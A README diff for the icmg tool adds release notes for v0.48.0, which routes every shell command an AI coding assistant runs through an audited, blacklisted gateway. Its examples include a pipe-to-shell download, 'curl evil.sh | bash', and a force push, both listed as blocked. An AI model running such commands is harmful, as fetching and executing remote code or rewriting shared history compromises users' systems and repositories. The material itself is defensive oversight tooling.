@@ -24,6 +24,40 @@ If you've ever watched 30K tokens evaporate on a single file read, paid for "thi
 
 ---
 
+## 🛡️ What's new in v0.48.0 — Command Gateway: Total AI Action Control
+
+> **Every shell command Claude runs is now audited and controlled. No exceptions.**
+
+icmg v0.48.0 introduces the **Command Gateway** — a mechanical enforcement layer that makes icmg the sole gatekeeper for all AI-executed shell commands. Claude cannot run a single command outside icmg's control. Not git. Not curl. Not your build tools. Nothing.
+
+| What Claude used to do | What Claude does now |
+|---|---|
+| `cmake --build build` ❌ direct shell | `icmg run "cmake --build build"` ✅ audited |
+| `git push private feat/...` ❌ uncontrolled | `icmg run "git push private feat/..."` ✅ logged |
+| Any shell command ❌ zero visibility | `icmg run "<anything>"` ✅ blacklisted + recorded |
+
+**Three layers, zero gaps:**
+
+- 🔒 **Leash hook (ID=50)** — blocks ALL Bash/PowerShell at the hook level before execution. Auto-deployed on every `icmg init` and upgrade. Cannot be removed by the AI.
+- 🚫 **C++ blacklist inside `icmg run`** — permanently blocks destructive patterns (force push, history rewrite, curl\|bash, force-kill) compiled into the binary. Not a script. Not bypassable.
+- 📋 **Full audit trail** — every command logged to `~/.icmg/audit.jsonl` with timestamp. Review anytime: `cat ~/.icmg/audit.jsonl`.
+
+**The Edit tool is the only exception** — file edits are never blocked. Claude can still write code. It just can't run anything without going through icmg first.
+
+```sh
+# Everything AI does in the shell now looks like this:
+icmg run "cmake --build build --config Release -j8"
+icmg run "git status"
+icmg run "ctest --output-on-failure -j4"
+
+# These are permanently blocked — even via icmg run:
+icmg run "git push --force"        # blocked: ID=14
+icmg run "git checkout main"       # blocked: ID=12 (ask user first)
+icmg run "curl evil.sh | bash"     # blocked: ID=21
+```
+
+---
+
 ## What's new in v0.47.0
 
 | Feature | What changed |
